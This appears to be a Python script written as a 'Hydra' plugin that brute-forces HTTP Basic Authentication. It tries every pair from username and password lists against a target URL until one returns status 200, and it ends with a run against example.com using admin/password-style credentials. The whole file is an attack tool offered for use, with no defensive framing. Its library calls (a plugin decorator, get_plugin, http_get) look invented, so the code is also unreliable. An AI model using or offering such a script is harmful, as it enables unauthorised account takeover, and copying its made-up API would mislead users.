# from hydra import Hydra
import hydra
from hydra import Hydra

@hydra.plugin()
class BasicAuthPlugin(Hydra):
    """
    Hydra plugin for HTTP Basic Authentication endpoints
    """
    name = "basic-auth"
    description = "Hydra plugin for HTTP Basic Authentication endpoints"

    def attack(self, target, username_list, password_list):
        """
        Start a brute-force attack on the target using the given username and password lists.
        """
        result = {}
        for username in username_list:
            for password in password_list:
                response = self.http_get(target, auth=(username, password))
                if response.status_code == 200:
                    result["success"] = {"username": username, "password": password}
                    return result
                else:
                    result["failure"] = {"username": username, "password": password}
        return result

basic_auth_plugin = Hydra.get_plugin("basic-auth")
result = basic_auth_plugin.attack("https://example.com/protected", ["admin", "user"], ["password", "123456"])
if "success" in result:
    print(f"Login successful! Username: {result['success']['username']}, Password: {result['success']['password']}")
else:
    print("Login unsuccessful.")
